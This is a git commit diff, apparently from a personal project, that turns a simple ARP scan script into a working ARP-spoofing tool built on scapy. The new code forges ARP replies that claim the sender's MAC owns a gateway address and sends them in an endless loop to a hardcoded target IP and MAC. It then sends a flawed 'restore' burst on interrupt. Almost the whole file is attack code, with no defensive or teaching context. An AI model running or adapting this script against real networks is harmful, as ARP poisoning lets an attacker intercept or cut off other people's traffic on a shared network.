4fa719bcdeab6908cb6abb1aec073856685f0dc0
calee14 <caplee1000@gmail.com>
2019-10-12 23:59:10 -0700

    worked out code to send packets

--- wifipro.py
+++ wifipro.py
@@ -1,6 +1,44 @@
 from scapy.all import *
-arp_frame = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst="10.1.9.135")
-resp, unas = srp(arp_frame)
+import time
+import uuid 
 
-for s,r in resp:
-	print(r[Ether].src)
+def get_mac_address():
+	import uuid
+	# after each 2 digits, join elements of getnode().
+	print ("The formatted MAC address is : ", end="")
+	print (':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
+	for elements in range(0,2*6,2)][::-1]))
+
+	return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
+	for elements in range(0,2*6,2)][::-1])
+
+def sendPackets(gateway_ip, target_ip, this_mac_address, target_mac_address):
+	arp = ARP()
+	arp.psrc = gateway_ip
+	arp.hwsrc = this_mac_address
+
+	arp = arp
+	arp.pdst = target_ip # (say IP address of target machine)
+	arp.hwdst = target_mac_address # target mac
+
+	ether = Ether()
+	ether.src = this_mac_address
+	ether.dst = target_mac_address
+
+	arp.op = 2
+
+	def broadcast():
+		packet = ether / arp
+		sendp(x=packet, verbose=True)
+
+	broadcast()
+
+try:
+	while True:
+		sendPackets("1.1.1.1", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
+except KeyboardInterrupt:
+	rearp = 0
+	while rearp != 10:
+		sendPackets("10.1.9.135", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
+		time.sleep(0.1)
+		rearp += 1
